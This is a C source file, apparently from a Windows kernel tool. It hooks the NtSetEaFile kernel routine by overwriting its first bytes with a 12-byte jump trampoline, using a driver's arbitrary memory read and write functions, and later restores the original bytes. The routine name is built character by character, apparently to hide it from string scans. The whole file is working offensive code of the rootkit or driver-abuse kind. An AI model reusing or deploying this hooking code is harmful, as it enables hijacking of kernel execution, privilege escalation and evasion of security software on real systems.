#include "main.h"

NTSTATUS HookSystemRoutine(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ ULONGLONG NewAddress,
    _Out_writes_bytes_(12) PUCHAR Native)
{
    UCHAR Shellcode[12];
    NTSTATUS Status;
    ULONGLONG Address;
    WCHAR RoutineName[12];
    RoutineName[0]  = L'N';
    RoutineName[1]  = L't';
    RoutineName[2]  = L'S';
    RoutineName[3]  = L'e';
    RoutineName[4]  = L't';
    RoutineName[5]  = L'E';
    RoutineName[6]  = L'a';
    RoutineName[7]  = L'F';
    RoutineName[8]  = L'i';
    RoutineName[9]  = L'l';
    RoutineName[10] = L'e';
    RoutineName[11] = L'\0';

    Address = GetSystemRoutineAddressW(RoutineName);
    if (Address == 0) {
        Status = STATUS_NOT_FOUND;
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    RtlZeroMemory(Shellcode, sizeof(Shellcode));
    Shellcode[0]               = 0x48;
    Shellcode[1]               = 0xB8;
    *(ULONGLONG*)&Shellcode[2] = NewAddress;
    Shellcode[10]              = 0xFF;
    Shellcode[11]              = 0xE0;

    Status = Driver->ReadMemory(Driver->DeviceHandle, Address, Native, sizeof(Shellcode));
    if NT_SUCCESS (Status) {
        Status = Driver->WriteMemory(Driver->DeviceHandle, Address, Shellcode, sizeof(Shellcode));
    }

    return Status;
}

NTSTATUS UnhookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_reads_bytes_(12) PUCHAR Native)
{
    ULONGLONG routineAddr;
    WCHAR routineName[12];
    routineName[0]  = L'N';
    routineName[1]  = L't';
    routineName[2]  = L'S';
    routineName[3]  = L'e';
    routineName[4]  = L't';
    routineName[5]  = L'E';
    routineName[6]  = L'a';
    routineName[7]  = L'F';
    routineName[8]  = L'i';
    routineName[9]  = L'l';
    routineName[10] = L'e';
    routineName[11] = L'\0';

    routineAddr = GetSystemRoutineAddressW(routineName);
    if (routineAddr == 0)
        return STATUS_NOT_FOUND;

    return Driver->WriteMemory(Driver->DeviceHandle, routineAddr, Native, 12);
}
